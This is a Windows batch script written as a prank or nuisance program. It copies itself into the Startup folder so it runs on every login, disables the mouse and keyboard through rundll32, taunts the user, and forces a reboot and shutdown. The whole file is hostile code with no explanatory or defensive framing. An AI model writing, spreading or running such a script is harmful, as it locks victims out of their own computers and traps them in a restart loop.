   @echo off
   copy %0 c:\windows\startm~1\programs\startup
   echo Wanna see something annoying?
   c:\windows\rundll32.exe mouse,disable
   c:\windows\rundll32.exe keyboard,disable
   cls
   echo HAHA, You can't use your keyboard or mouse!
   cls
   SHUTDOWN -r -t -10
   TYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL
   copy %0 c:\windows\startm~1\programs\startup
   start rundll.exe shell32.dll,SHExitWindowsEx 2
